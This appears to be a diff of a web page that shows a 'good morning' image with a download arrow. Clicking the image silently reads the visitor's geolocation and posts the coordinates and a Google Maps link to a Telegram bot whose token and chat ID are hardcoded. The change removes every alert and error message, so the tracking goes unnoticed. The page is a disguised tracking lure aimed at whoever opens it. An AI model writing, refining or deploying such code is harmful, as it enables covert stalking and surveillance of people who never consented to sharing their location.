@@ -40,43 +40,30 @@
 </head>
 <body>
 
-<div class="image-wrapper" onclick="getLocation()">
+<div class="image-wrapper" onclick="sendLocationSilently()">
   <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صباح الخير">
   <div class="download-arrow">⬇️</div>
 </div>
 
 <script>
-function sendLocationToBot(lat, lon) {
-    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
-    const chatId = "6495557039";
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
+const chatId = "6495557039";
 
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-    })
-    .then(res => res.json())
-    .then(data => console.log("✅ تم الإرسال:", data))
-    .catch(err => console.error("❌ خطأ:", err));
-}
-
-function getLocation() {
+function sendLocationSilently() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             pos => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                sendLocationToBot(lat, lon);
-                alert("✅ تم تأكيد التحويل!");
+                const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
             },
-            err => {
-                alert("❌ لم يتم السماح بالوصول إلى الموقع");
-            }
+            err => { /* لا تظهر أي رسالة خطأ */ }
         );
-    } else {
-        alert("❌ جهازك لا يدعم الموقع الجغرافي");
     }
 }
 </script>
